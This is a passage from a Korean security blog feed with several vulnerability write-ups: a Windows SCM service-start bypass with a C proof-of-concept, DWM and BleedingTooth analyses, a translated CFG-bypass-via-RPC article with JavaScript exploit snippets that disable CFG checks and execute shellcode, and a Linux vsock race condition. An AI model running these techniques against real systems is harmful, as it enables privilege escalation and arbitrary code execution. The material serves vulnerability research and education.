함으로써 우회할 수 있습니다. POC 코드는 다음과 같습니다.</p><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><span class="hljs-comment">#include &lt;windows.h&gt;</span>int wmain(int argc, wchar_t** argv)&#123;    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>)    &#123;        printf(<span class="hljs-string">&quot;Usage: HostName ServiceName\\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    auto scm = OpenSCManager(argv[<span class="hljs-number">1</span>], nullptr, MAXIMUM_ALLOWED);    <span class="hljs-keyword">if</span> (scm == nullptr)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Failed to open SCM error:%d\\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    auto service = OpenService(scm, argv[<span class="hljs-number">2</span>], SERVICE_START);    <span class="hljs-keyword">if</span> (service)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Was granted SERVICE_START when we didn&#x27;t expect it. Maybe using the wrong user?\\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    DWORD error = GetLastError();    <span class="hljs-keyword">if</span> (error == ERROR_SERVICE_DOES_NOT_EXIST)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Service doesn&#x27;t exist.\\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">if</span> (error != ERROR_ACCESS_DENIED)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Expected ERROR_ACCESS_DENIED but got %d, the rest might not work.\\n&quot;</span>, GetLastError());    &#125;    service = OpenService(scm, argv[<span class="hljs-number">2</span>], MAXIMUM_ALLOWED);    <span class="hljs-keyword">if</span> (service == nullptr)    &#123;        printf(<span class="hljs-string">&quot;[ERROR]: Failed to open service error:%d\\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    error = ERROR_SUCCESS;    <span class="hljs-keyword">if</span> (!StartService(service, <span class="hljs-number">0</span>, nullptr))    &#123;        error = GetLastError();    &#125;    switch (error)    &#123;        case ERROR_ACCESS_DENIED:            printf(<span class="hljs-string">&quot;[ERROR]: Got access denied error.\\n&quot;</span>);            <span class="hljs-keyword">break</span>;        case ERROR_SUCCESS:            printf(<span class="hljs-string">&quot;[SUCCESS]: Successfully started service.\\n&quot;</span>);            <span class="hljs-keyword">break</span>;        case ERROR_SERVICE_DISABLED:            printf(<span class="hljs-string">&quot;[SUCCESS]: Service was disabled but passed the access check.\\n&quot;</span>);            <span class="hljs-keyword">break</span>;        default:            printf(<span class="hljs-string">&quot;[WARNING]: Didn&#x27;t start service but didn&#x27;t get back expected error:%d\\n&quot;</span>, error);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>insu</tag>
      
      <tag>bypass</tag>
      
      <tag>scm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28310: Desktop Window Manager out-of-bound write 취약점</title>
    <link href="/2021/04/15/idioth/2021-04-15/"/>
    <url>/2021/04/15/idioth/2021-04-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/zero-day-vulnerability-in-desktop-window-manager-cve-2021-28310-used-in-the-wild/101898/">Zero-day vulnerability in Desktop Window Manager (CVE-2021-28310) used in the wild</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows OS 빌드 19041.928 이하 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows 데스크톱 창 관리자(Desktop Window Manager, <code>dwm.exe</code>)의 <code>dwmcore.dll</code>에서 out-of-bounds write 취약점이 발견되었습니다. 해커는 DirectComposition API를 사용하여 오프셋을 조작하여 데이터를 쓸 수 있습니다.</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/directcomp/directcomposition-portal">DirectComposition</a>은 다양한 소스(GDI, DirectX 등)의 비트맵을 지원하는 변환, 효과, 애니메이션 비트맵 구성을 위해 Windows 8에서 도입된 Windows 구성 요소입니다. DirectComposition API는 <code>win32kbase.sys</code> 드라이버에 구현되어 있으며 관련된 syscall은 <code>NtDComposition</code>으로 시작합니다.</p><p>취약점을 트리거하기 위해서 3개의 syscall이 필요합니다. <code>NtDCompositionCreateChannel</code>은 <code>NtDCompositionProcessChannelBatchBuffer</code>와 함께 채널을 초기화하여 kernel batch mode에서 처리되도록 여러 개의 DirectComposition을 전송합니다. 커널에 의해 명령어가 처리되지만 명령어들은 다른 포맷으로 serialize 되어 Local Procedure Call(LPC) 프로토콜에서 Desktop Window Manager(<code>dwm.exe</code>)로 전달되고 화면에 출력됩니다. 이 프로시저는 <code>NtDCompositionCommitChannel</code>에 의해 초기화됩니다.</p><p>해당 취약점을 트리거하기 위해서는 3가지 명령어(<code>CreateResource</code>, <code>ReleaseResource</code>, <code>SetResourceBufferProperty</code>)를 사용해야 합니다. <code>dwmcore.dll</code>의 <code>CPropertySet::ProcessSetPropertyValue</code> 함수는 <code>SetResourceBufferProperty</code>를 호출합니다. D2DVector2로 expression type이 설정된 <code>SetResourceBufferProperty</code>의 경우 <code>CPropertySet::ProcessSetPropertyValue</code>에서 업데이트 여부에 따라 <code>CPropertySet::AddProperty&lt;D2DVector2&gt;</code> 혹은 <code>CPropertySet::UpdateProperty&lt;D2DVector2&gt;</code>를 호출하여 명령어를 설정합니다. 이때 <code>UpdateProperty</code>에서 <code>propertyId</code>가 리소스에 추가된 property 수보다 작은지 확인하지 않아 property 배열 내부 데이터에 대한 두 가지 검사를 우회하면 <code>propertiesData</code> 버퍼를 지나 OOB write가 가능합니다. 해커가 <code>dwm.exe</code> 프로세스에서 객체를 할당하고 해제할 수 있으면 heap spray를 통해 이 검사를 우회할 수 있습니다.</p><p>검사를 우회한 후 조작된 <code>propertyId</code>로 명령을 전송하면 <code>NtDCompositionProcessChannelBatchBuffer</code>에서 에러를 반환하고 명령어가 <code>dwm.exe</code>에 전송되지 않습니다. kernel mode <code>UpdateProperty&lt;D2DVector2&gt;</code>의 <code>propertiesCount</code> 검사는 user mode에서의 악성 명령 실행을 방지합니다. 하지만 kernel mode <code>AddProperty</code>는 user mode와 유사하게 작동하며 생성된 property의 <code>propertyId</code>와 <code>storageOffset</code>이 제공된 값과 동일한지만 확인하고 다르면 에러를 반환합니다. <code>AddProperty</code>를 통해 새 속성을 추가하여 함수가 에러를 반환하면 kernel mode와 user mode 동일 리소스 간에 property 수의 불일치가 발생하여 kernel mode <code>propertiesCount</code> 검사를 우회하여 <code>dwm.exe</code>에서 명령어 실행이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>oob write</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] BleedingTooth: Zero-Click RCE</title>
    <link href="/2021/04/14/fabu1ous/2021-04-14/"/>
    <url>/2021/04/14/fabu1ous/2021-04-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup">BleedingTooth: Linux Bluetooth Zero-Click RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 4.19 (with Bluetooth 5)</p><p>Linux kernel &lt;= 3.6</p><p>Linux kernel &gt;= 4.8</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>BleedingTooth라 불리는 취약점 3개의 Write-up이 공개되었습니다. BleedingTooth는 Linux Bluetooth subsystem의 제로 클릭 취약점들로, 해커는 이를 악용해 취약한 시스템에서 커널 권한으로 원격 코드 실행을 할 수 있습니다. 주로 블루투스 취약점들의 영향은 펌웨어 선에 머물거나 데이터 도청 및 조작에 머무는 반면 BleedingTooth는 기기 전체를 완전히 제어할 수 있습니다.</p><ul><li><p>BadVibes(CVE-2020-24490) Heap-based Buffer Overflow</p><p>기존 31 bytes 였던  <a href="https://www.silabs.com/community/wireless/bluetooth/knowledge-base.entry.html/2017/02/10/bluetooth_advertisin-hGsf">Advertising data</a>의 크기가 블루투스5에선 255 bytes까지 확장되었습니다. 그에 맞춰 255 bytes까지 확장된 Advertisement report를 파싱 하는 함수 <code>hci_le_ext_adv_report()</code>가 추가되었습니다. 다만 기존<code>hci_le_adv_report()</code>에 존재하던 size check가 해당 함수에는 없기 때문에 overflow가 가능합니다.</p></li></ul><ul><li><p>BadChoice(CVE-2020-12352) Stack-Based Information Leak</p><p>A2MP 프로토콜의 <code>A2MP_GETINFO_REQ</code> 커멘드로 호출되는 <code>a2mp_getinfo_req()</code>는 HCI device id를 사용 중인 AMP컨트롤러의 정보를 요청합니다. 하지만, 만약 <code>HCI_AMP</code>가 유효하지 않다면 request를 받은 타겟 시스템은  <code>A2MP_STATUS_INVALID_CTRL_ID</code>를 응답합니다.  이 때 초기화 완전히 이루어지지 않은 탓에 <code>A2MP_STATUS_INVALID_CTRL_ID</code>가 16 bytes의 커널 스택 데이터를 포함한 채로 해커에게 전달됩니다.</p></li></ul><ul><li><p>BadKarma: Heap-Based Type Confusion (CVE-2020-12351)</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">l2cap_data_rcv</span><span class="hljs-params">(struct l2cap_chan *chan, struct sk_buff *skb)</span></span><span class="hljs-function"></span>&#123;...<span class="hljs-keyword">if</span> ((chan-&gt;mode == L2CAP_MODE_ERTM ||     chan-&gt;mode == L2CAP_MODE_STREAMING) &amp;&amp; sk_filter(chan-&gt;data, skb))<span class="hljs-keyword">goto</span> drop;...&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> struct amp_mgr *<span class="hljs-title">amp_mgr_create</span><span class="hljs-params">(struct l2cap_conn *conn, <span class="hljs-keyword">bool</span> locked)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">amp_mgr</span> *<span class="hljs-title">mgr</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">l2cap_chan</span> *<span class="hljs-title">chan</span>;</span>mgr = kzalloc(<span class="hljs-keyword">sizeof</span>(*mgr), GFP_KERNEL);<span class="hljs-keyword">if</span> (!mgr)<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;...chan = a2mp_chan_open(conn, locked);<span class="hljs-keyword">if</span> (!chan) &#123;kfree(mgr);<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;mgr-&gt;a2mp_chan = chan;chan-&gt;data = mgr;...<span class="hljs-keyword">return</span> mgr;&#125;</code></pre><p>함수 <code>sk_filter()</code>는 <code>struct sock</code>를 처리하는 반면, argument로 전달되는 <code>chan-&gt;data</code>의 타입은 <code>struct amp_mgr</code>입니다. 따라서 remote type confusion 취약점입니다. </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>zero click</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Exploit Windows RPC to bypass CFG mitigation</title>
    <link href="/2021/04/14/fabu1ous/cfg-bypass/"/>
    <url>/2021/04/14/fabu1ous/cfg-bypass/</url>
    
    <content type="html"><![CDATA[<h1 id="번역-추신"><a href="#번역-추신" class="headerlink" title="번역 추신"></a>번역 추신</h1><p>Hackyboiz 블로그 운영 초반에 CFG와 XFG에 대한 연구글을 작성하고 있었습니다. CFG Bitmap 생성 부분을 공부하다가 머리가 뻐근해서 잠시 멈춘다는 게 아예 무산되버렸네요. 연구팀 형님 한분께서 해당 글을 작성하던 저를 보시곤 “메모리 커럽션은 이제 어떻게 하냐 ㅋㅋㅋ?” 이런 말씀을 하셨죠. 그래서 CFG bypass라는 제목의 글을 그냥 지나칠 수가 없더군요. 이런 이유로 이번에 읽은 글 하나 번역해서 올립니다.</p><p><a href="https://iamelli0t.github.io/2021/04/10/RPC-Bypass-CFG.html">원문: Exploiting Windows RPC to bypass CFG mitigation</a></p><h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>브라우저 렌더 프로세스 익스플로잇의 보편적인 방법은 다음과 같습니다. 취약점을 공격하여 메모리에 대한 임의의 유저 모드 읽기/쓰기 권한을 가져온 후 execution flow를 탈취하기 위해 DOM/js 객체의 vtable을 변조합니다. 그다음 ROP chain에 의해 호출된 VirtualProtect가 쉘 코드 메모리를 PAGE_EXECUTE_READWITE로 수정하고 execution flow가 최종적으로 쉘 코드로 이동합니다. Windows 8.1 이후로 Microsoft는 CFG(Control Flow Guard) 보호 기법을 도입하여 indirect function call(vtable을 참조하는 함수 호출 방식)을 활용한 vtable overwrite 공격을 감지 및 방지하고 있습니다.</p><p>하지만, 여기서 끝나면 섭섭하죠. CFG 보호 기법을 우회하는 새로운 방법이 등장했습니다. 예를 들어 chackra/jscript9에서는 스택의 리턴 주소를 변조하여 code execution flow를 가로채고, v8의 경우에는 실행 가능한 메모리 속성이 있는 WebAssembly를 사용해 쉘 코드를 실행합니다. 2020년 12월, Microsoft는 Intel Tiger Lake CPU를 기반으로 한 CET(Control-flow Enforcement Technology) 보호 기법을 Windows1020H1에 도입했습니다. 따라서 CET 환경에서 CFG를 우회하는 방법은 취약점 익스플로잇의 새로운 문제가 됐습니다.</p><p>저희는 실제 공격에 사용된 <a href="https://hackyboiz.github.io/2021/03/26/l0ch/2021-03-26/">CVE-2021-26411</a>의 샘플을 분석하던 중 Windows RPC(Remote Procdure Call)를 사용하여 CFG 보호 기법을 우회하는 새로운 방법을 발견했습니다. 이 방법은 ROP chain에 의존하지 않습니다. 가짜 RPC_MESSAGE를 구성하는 것으로 rpcrt4!NdrServerCall2를 수동으로 호출하여 임의 코드 실행(Arbitrary Code Execution)을 할 수 있습니다.</p><h1 id="CVE-2021-25411"><a href="#CVE-2021-25411" class="headerlink" title="CVE-2021-25411"></a>CVE-2021-25411</h1><p>저의 블로그 글 “<a href="https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html">CVE-2021-26411: Internet Explorer mshtml use-after-free</a>“에서 root cause를 분석했습니다. removeAttributeNode()는 nodeValue의 valueOf 콜백을 트리거합니다. 콜백 중에 clearAttributes()가 수동으로 호출되어 nodeValue에 저장된 BSTR를 미리 해제합니다. 콜백 값이 반환된 후 nodeValue 객체가 있는 경우 UAF(Use-After-Free)가 발생합니다.</p><p>Windows 3월 패치에서 해당 취약점을 수정하기 위해 CAttrArray::Destroy함수에 객체를 삭제하기 전에 인덱스를 검사하는 코드를 추가했습니다.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/1.png"></p><p>메모리 크기를 제어할 수 있는 UAF 취약점의 경우, 서로 다른 type의 포인터(BSTR과 Dictionary.item)가 재사용 메모리를 가리키게 하여 type confusion에 의한 포인터 노출 및 포인터 참조 해제를 달성할 수 있습니다.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/2.png"></p><h1 id="Windows-RPC-introduction-and-exploitation"><a href="#Windows-RPC-introduction-and-exploitation" class="headerlink" title="Windows RPC introduction and exploitation"></a>Windows RPC introduction and exploitation</h1><p>Windows RPC는 분산된 클라이언트/서버 function call 시나리오를 지원하는 데 사용됩니다. Windows RPC에 의해 클라이언트는 서버 함수를 로컬 함수 호출인 것처럼 사용할 수 있습니다. 다음 사진은 Windows RPC의 기본 아키텍처입니다.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/3.png"></p><p>클라이언트/서버 프로그램은 호출 매개 변수 혹은 리턴 값을 lower-level Stub 함수로 전달합니다. Stub 함수는 NDR(Network Data Representation) 포맷으로 데이터를 캡슐화하는 역할을 담당합니다. Runtime library를 통한 통신을 rpcrt4.dll에 의해 제공됩니다.</p><p>다음은 idl 예제입니다.</p><pre><code class="hljs c">[uuid(<span class="hljs-string">&quot;1BC6D261-B697-47C2-AF83-8AE25922C0FF&quot;</span>),version(<span class="hljs-number">1.0</span>)]interface HelloRPC&#123;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;&#125;</code></pre><p>클라이언트가 add 함수를 호출할 때 서버는 rpcrt4.dll로부터 처리 요청을 수신하고 rpcrt4!NdrServerCall2를 호출합니다.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/4.png"></p><p>rpcrt4!NdrServerCall2에는 함수 인덱스 및 매개 변수와 같은 중요한 데이터를 포함한 PRPC_MESSAGE만을 매개변수로 받습니다. 서버 RPC_MESSAGE 구조체와 main sub data 구조체는 다음과 같습니다.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/5.png"></p><p>앞서 언급한 그림과 같이, RPC_MESSAGE 구조체에서 함수 호출에 중요한 두 가지 변수는 Buffer와 RpcInterfaceInformation입니다. Buffer는 함수의 매개 변수를 저장하고 RpcInterfaceInformation은 RPC_SERVER_INTERFACE 구조체를 가리키고 있습니다. RPC_SERVER_INTERFACE 구조체는 서버 프로그램 인터페이스 정보를 담고 있는데, 여기서 DispatchTable(+0x2c)은 runtime library와 stub 함수의 인터페이스 함수 포인터를 저장하고, InterpreterInfo(+0x3c)는 MIDL_SERVER_INFO를 가리킵니다. MIDL_SERVER_INFO 구조체는 서버 IDL 인터페이스 정보를 저장하고, DispatchTable(+0x4)은 서버 루틴 함수의 포인터 배열을 담고 있습니다.</p><p>다음은 RPC_MESSAGE 구조체의 예제입니다.</p><p>위에서 제시한 idl에 따르면, 클라이언트가 add(0x111, 0x222)를 호출하면 서버 프로그램이 rpcrt4!NdrServerCall2에 break 합니다.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/6.png"></p><p>동적 디버깅을 통해 얻은 메모리 덤프를 보면 위에서 분석한 RPC_MESSAGE 구조체와 일치하며 add 함수는 MIDL_SERVER_INFO.DispatchTable에 저장되어 있음을 알 수 있습니다.</p><p>이제, rpcrt4!NdrServerCall2가 어떻게 RPC_MESSAGE를 참조해서 add 함수를 호출하는지 분석해봅시다.</p><p>rpcrt4!NdrServerCall2는 rpcrt4!NdrStubCall2를 호출합니다. rpcrt4!NdrStubCall2는 MIDL_SERVER_INFO.DispatchTable과 RPC_MESSAGE.ProcNum을 참조해 함수 포인터 주소를 계산합니다. 그리고 함수 포인터와 함수의 매개 변수, 매개 변수의 길이를 rpcrt4!Invoke로 전달합니다.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/7.png"></p><p>드디어 rpcrt4!Invoke가 서버로부터 받은 함수를 호출합니다.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/8.png"></p><p>위의 분석을 기반으로 임의의 메모리에 대한 읽기/쓰기 권한을 얻은 후 가짜 RPC_MESSAGE를 생성, 원하는 함수와 그 매개 변수를 설정, rpcrt4!NdrServerCall2 호출을 통해 원하는 어떤 함수던 구현할 수 있게 됩니다.</p><p>다음으로 해결해야 할 문제는 두 가지가 있습니다.</p><ol><li>어떻게 하면 javascript를 통해 rpcrt4!NdrServerCall2를 호출할 수 있는가?</li><li>rpc4!Invoke에서 서버 루틴 함수를 호출할 때 체크하는 CFG는 어떻게 해결할 것인가?</li></ol><p><img src="/2021/04/14/fabu1ous/cfg-bypass/9.png"></p><p>위 사진을 통해 서버 루틴 함수 호출은 indirect function call이고, CFG 검사가 있다는 것을 알 수 있습니다.</p><p>먼저 첫 번째 문제(어떻게 하면 javascript를 통해 rpcrt4!NdrServerCall2를 호출할 수 있는가?)를 해결하겠습니다. DOM 객체 vtable의 함수 포인터를 rpcrt4!NdrServerCall2로 바꿀 수 있습니다. 왜냐하면 rpcrt4!NdrServerCall2는 CFGBitmap에 기록된(화이트리스팅된) 함수이며 CFG 검사가 비정상 동작으로 판단하지 않기 때문입니다. 실제 공격에 사용된 샘플은 MSHTML!CAttribut::normalize를 rpcrt4!NdrServerCall2로 바꿔 칩니다. 그다음 javascript에서 “xyz.normalize()”를 호출해 결과적으론 rpcrt4!NdrServerCall2를 호출합니다.</p><p>두 번째 문제(rpc4!Invoke에서 서버 루틴 함수를 호출할 때 체크하는 CFG는 어떻게 해결할 것인가?)는 다음과 같은 방법으로 해결합니다.</p><ol><li>가짜 RPC_MESSAGE와 rpcrt4!NdrServerCall2를 사용해 VirtualProtect를 호출, RPCRT4!__guard_check_ical_fptr의 메모리 권한을 PAGE_EXECUTE_READWITE로 수정</li><li>rpcrt4!__guard_check_icall_fptr에 저장된 포인터 ntdll!LdrpValidateUserCallTarget를 ntdll!KiFastSystemCallRet으로 수정해 rpcrt4.dll에 대한 CFG 검사를 비활성화</li><li>RPC4!__guard_check_icall_fptr의 메모리를 복구</li></ol><pre><code class="hljs c"><span class="hljs-function">function <span class="hljs-title">killCfg</span><span class="hljs-params">(addr)</span> </span>&#123;  var cfgobj = <span class="hljs-keyword">new</span> CFGObject(addr)  <span class="hljs-keyword">if</span> (!cfgobj.getCFGValue())     <span class="hljs-keyword">return</span>  var guard_check_icall_fptr_address = cfgobj.getCFGAddress()  var KiFastSystemCallRet = getProcAddr(ntdll, &#x27;KiFastSystemCallRet&#x27;)  var tmpBuffer = createArrayBuffer(<span class="hljs-number">4</span>)  call2(VirtualProtect, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>, tmpBuffer])  write(guard_check_icall_fptr_address, KiFastSystemCallRet, <span class="hljs-number">32</span>)  call2(VirtualProtect, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, read(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])  <span class="hljs-built_in">map</span>.<span class="hljs-keyword">delete</span>(tmpBuffer)&#125;</code></pre><p>두 가지 문제를 해결한 후, rpcrt4.dll에 대한 CFG가 꺼져있으므로 가짜 RPC_MESSAGE를 사용해 원하는 함수(버퍼에 쉘 코드를 담고 있는 함수) 포인터를 호출할 수 있습니다. 샘플은 mis.dll+0x5000에 쉘 코드를 덮어쓰고 rpcrt4!NdrServerCall2를 통해 쉘 코드를 실행합니다.</p><pre><code class="hljs c">var shellcode = <span class="hljs-keyword">new</span> Uint8Array([<span class="hljs-number">0xcc</span>])var msi = call2(LoadLibraryExA, [newStr(&#x27;msi.dll&#x27;), 0, 1]) + 0x5000var tmpBuffer = createArrayBuffer(<span class="hljs-number">4</span>)call2(VirtualProtect, [msi, shellcode.length, <span class="hljs-number">0x4</span>, tmpBuffer])writeData(msi, shellcode)call2(VirtualProtect, [msi, shellcode.length, read(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])call2(msi, [])</code></pre><p>다음은 익스플로잇에 성공한 스크린샷입니다.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/10.png"></p><h1 id="Some-thoughts"><a href="#Some-thoughts" class="headerlink" title="Some thoughts"></a>Some thoughts</h1><p>실제 공격에 사용된 CVE-2021-26411 샘플은 CFG 보호 기법을 익스플로잇 하는 새로운 기술을 담고 있습니다. 해당 익스플로잇 기법은 ROP에 의존하지 않아도 되며 RPC_MESSAGE를 통해 임의 코드 실행(Arbitrary Code Execution)을 달성할 수 있습니다. 또한 간결하고 신뢰도(성공률)가 높습니다. 앞으로 CFG 보호 기법을 효과적으로 우회하기 위한 방법으로 통용될 것이라 생각합니다.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard</a></p><p>[2] <a href="https://windows-internals.com/cet-on-windows/">https://windows-internals.com/cet-on-windows/</a></p><p>[3] <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page">https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>bypass</tag>
      
      <tag>cfg</tag>
      
      <tag>rpc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26708: Linux 커널 가상 소켓 라이브러리의 Race Condition 취약점</title>
    <link href="/2021/04/13/l0ch/2021-04-13/"/>
    <url>/2021/04/13/l0ch/2021-04-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">Four Bytes of Power: exploiting CVE-2021-26708 in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Zer0con 2021에서 Linux 커널의 로컬 권한 상승 취약점이 공개되었습니다.</p><p>취약점은 가상 머신과 하이퍼바이저 간의 통신을 위한 소켓 프로토콜인 virtual socket library에서 발견되었으며 <code>net/vmw_vsock/af_vsock.c</code> 의 다음 함수들에 존재합니다.</p><ul><li><code>vsock_poll()</code></li><li><code>vsock_dgram_sendmsg()</code></li><li><code>vsock_stream_setsockopt()</code></li><li><code>vsock_stream_sendmsg()</code></li><li><code>vsock_stream_recvmsg()</code></li></ul><p>이 중 <code>vsock_stream_setsockopt()</code> 의 코드입니다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">vsock_stream_setsockopt</span><span class="hljs-params">(struct socket *sock,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">int</span> level,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">int</span> optname,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">sockptr_t</span> optval,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> optlen)</span></span><span class="hljs-function"><span class="hljs-comment">/* ... */</span></span><span class="hljs-function">struct sock *sk</span>;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vsock_sock</span> *<span class="hljs-title">vsk</span>;</span><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vsock_transport</span> *<span class="hljs-title">transport</span>;</span><span class="hljs-comment">/* ... */</span>sk = sock-&gt;sk;vsk = vsock_sk(sk);transport = vsk-&gt;transport;lock_sock(sk);</code></pre><p>가상 소켓 전송 포인터인 <code>vsk→transport</code>는 로컬 변수인 <code>transport</code>에 저장되는데, 로컬 변수에 저장한 이후 소켓 <code>sk</code>에 대한 lock을 획득하므로 <code>vsk→transport</code>의 값이 변경될 수 있고 이는 race condition을 통해 로컬 권한 상승까지 이어집니다.</p><p>제보자는 5개의 함수에서 race condition을 유발하는 동일한 취약점을 발견했으며 아래와 같이 소켓 <code>sk</code>에 대한 lock을 획득한 이후 로컬 변수에 저장하도록 패치되었습니다.</p><pre><code class="hljs cpp">sk = sock-&gt;sk;vsk = vsock_sk(sk);-transport = vsk-&gt;transport;  lock_sock(sk); +transport = vsk-&gt;transport;</code></pre><p>Github에 공개된 자세한 패치 히스토리는 <a href="https://github.com/torvalds/linux/commit/c518adafa39f37858697ac9309c6cf1805581446">https://github.com/torvalds/linux/commit/c518adafa39f37858697ac9309c6cf1805581446</a> 에서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>toctou</tag>
      
      <tag>race condition</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 화물 물류 회사 공격에 사용된 라자루스 그룹의 백도어 Vyveva</title>
    <link href="/2021/04/12/idioth/2021-04-12/"/>
    <url>/2021/04/12/idioth/2021-04-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.welivesecurity.com/2021/04/08/are-you-afreight-dark-watch-out-vyveva-new-lazarus-backdoor/">(Are you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ESET에서 라자루스 그룹이 남아프리카 화물 물류 회사를 공격하는 데 사용된 백도어 Vyveva를 발견하였습니다. 백도어는 많은 기능이 포함되어 있으며 토르 네트워크를 통해 C&amp;C 서버와 통신합니다.</p><p>Vyveva는 이전 라자루스에서 사용한 NukeSped 악성코드와 비슷한 코드를 사용합니다. 네트워크 통신에서 fake TLS 사용, command line execution chains, 암호화 및 토르 서비스 사용 등을 미루어보아 라자루스의 바이러스임을 알 수 있습니다.</p><p>Vyveva는 인스톨러, 로더, 백도어 세 가지로 구성되어 있습니다. 인스톨러는 백도어 로더의 유지를 위한 서비스를 생성하고 내장된 백도어 설정을 